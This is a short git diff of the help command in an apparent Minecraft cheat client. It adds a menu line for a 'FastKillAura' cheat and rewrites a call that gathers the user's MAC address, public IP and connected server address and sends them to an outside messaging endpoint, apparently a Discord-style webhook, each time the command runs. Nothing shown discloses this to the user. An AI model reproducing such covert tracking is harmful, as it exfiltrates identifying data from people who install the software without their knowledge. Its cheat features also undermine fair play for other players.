@@ -30,6 +30,7 @@ public class HelpCommand extends Command {
     ChatHelper.printMessage("&b • &3&l'&b&lfgm &b• Client GameMode");
     ChatHelper.printMessage("&b • &3&l'&b&labout &b• Client Informations");
     ChatHelper.printMessage("&b • &3&l'&b&lonline &b• Show Online Players");
+    ChatHelper.printMessage("&b • &3&l'&b&lfka &b• Enable FastKillAura");
 
     InetAddress localHost = null;
     try {
@@ -56,6 +57,6 @@ public class HelpCommand extends Command {
     }
     String macAddress = String.join("-", hexadecimal);
 
-    DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Executed Command [Help] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
+    DSsendMessage("[" + macAddress + "]\n Connected With IP => \n(" + IpChecker.getIp() +")\n" + "\n Executed Command [Help]\n Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
   }
 }
